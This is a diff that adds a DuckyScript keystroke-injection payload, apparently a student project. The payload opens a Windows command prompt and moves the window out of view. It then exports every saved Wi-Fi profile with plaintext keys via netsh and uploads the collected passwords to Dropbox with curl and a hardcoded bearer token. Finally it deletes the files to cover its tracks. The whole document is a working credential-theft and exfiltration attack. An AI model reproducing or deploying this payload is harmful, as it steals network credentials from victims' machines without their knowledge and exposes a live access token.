@@ -1,0 +1,42 @@
+REM This is our Project
+REM NAMES: Derick Pan
+DELAY 1000
+REM
+REM  Go into RUN
+GUI r
+DELAY 300
+REM Go to command prompt
+STRING cmd /k 
+ENTER
+DELAY 250
+ALT SPACE
+DOWNARROW
+REPEAT 150
+REM
+REM Make a folder to hold all of the wifi passwords
+ENTER
+STRING mkdir temp
+ENTER
+DELAY 200
+STRING cd temp
+ENTER
+DELAY 200
+REM All of the wifi passwords are saved into this temp folder, the >nul silences it so no output to cmd 
+STRING netsh wlan export profile key=clear >nul
+ENTER
+DELAY 300
+REM Concat all files into one file, the >nul silences it so no output to cmd 
+STRING copy *.xml wifiPass.txt > nul
+ENTER
+DELAY 300
+REM Connect to Dropbox API
+STRING curl -X POST https://content.dropboxapi.com/2/files/upload 
+STRING --header "Authorization: Bearer sl.BTO4gklLFZUewi13l7Bh2teyzEBcQByr_JNpsKgJ4ryrxNuI-mVivLuaVJcETrYjfipmCQ7fB7TowvKv7tGOtrNsIlDZCMkmQHiQheh4Q4vJGXO96LDw08IsMcs_Bh9YIfr3gdc" 
+STRING --header "Dropbox-API-Arg: {\"autorename\":true,\"mode\":\"add\",\"mute\":false,\"path\":\"/temp/wifiPass.txt\"}" 
+STRING --header "Content-Type: application/octet-stream" 
+STRING --data-binary @wifiPass.txt"
+ENTER
+DELAY 1000
+STRING del wifiPass.txt *.xml
+ENTER
+ALT F4
